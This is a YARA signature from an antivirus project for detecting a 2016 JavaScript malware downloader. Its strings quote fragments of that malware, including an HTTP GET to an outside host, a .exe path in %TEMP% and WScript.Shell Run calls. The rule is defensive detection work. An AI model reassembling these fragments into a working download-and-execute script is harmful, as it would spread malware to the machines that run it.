rule sig_20160329_74ba7d0d1ed670d4d2c529cdd7ae83fe {
  meta:
    description = "datamaliciousorder - file 20160329_74ba7d0d1ed670d4d2c529cdd7ae83fe.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ad7ff73fbcb0bf5bbad81f6347921ef7e12f4e0448a545ec5f4aabb5cfb4215a"

  strings:
    $s1  = "ep[Kj](\"GET\", \"http://www.deco-dessert.com/k3dua\", false);" fullword ascii
    $s2  = "function s() {return bv[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"5ZwahDABo.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[n](va() * 11); if (ep[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function on(O0, Ip){t = t * 1; return O0 - Ip;};" fullword ascii
    $s5  = "var bv = function A() {return WScript[i](\"WScript.Shell\");}(), Sc = 11;" fullword ascii
    $s6  = "function IT(){return \"\" + gz;};" fullword ascii
    $s7  = "function Z(xQ){bv[\"Run\"](xQ, t, t);};" fullword ascii
    $s8  = "function uX() {return ((l == true) && (l == D)) ? 1 : t;};" fullword ascii
    $s9  = " while (Jz){" fullword ascii
    $s10 = "function va(){return 22;};" fullword ascii
    $s11 = "function vX(){return i;};" fullword ascii
    $s12 = "var Fz = new this[\"Date\"]();" fullword ascii
    $s13 = "function NR(aE) {var UM = (1, 2, 3, 4, 5, aE); return UM;};" fullword ascii
    $s14 = "return on(WM, gU);" fullword ascii
    $s15 = "function Xl()" fullword ascii
    $s16 = "var l = false;" fullword ascii
    $s17 = "l = true; " fullword ascii
    $s18 = "var sl = false;" fullword ascii
    $s19 = "} catch(xN){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}